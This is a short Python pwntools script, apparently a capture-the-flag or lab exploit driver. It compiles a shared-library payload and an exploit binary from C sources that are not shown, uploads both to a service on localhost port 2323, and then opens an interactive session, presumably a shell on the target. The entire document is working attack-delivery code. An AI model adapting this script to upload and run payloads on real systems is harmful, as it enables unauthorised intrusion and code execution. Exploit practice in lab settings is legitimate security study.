#!/usr/bin/env python3
from pwn import *
import time
import os

os.system('gcc ./payload.c -shared -Wl,--version-script,payload.map -o ./payload')
os.system('gcc ./exploit.c -o ./exploit')

f = open('./exploit','rb').read()
r = remote('localhost',2323)
r.sendlineafter(':',str(len(f)))
time.sleep(1)
r.send(f)
f = open('./payload','rb').read()

r.sendlineafter(':',str(len(f)))
time.sleep(1)
r.send(f)

r.interactive()
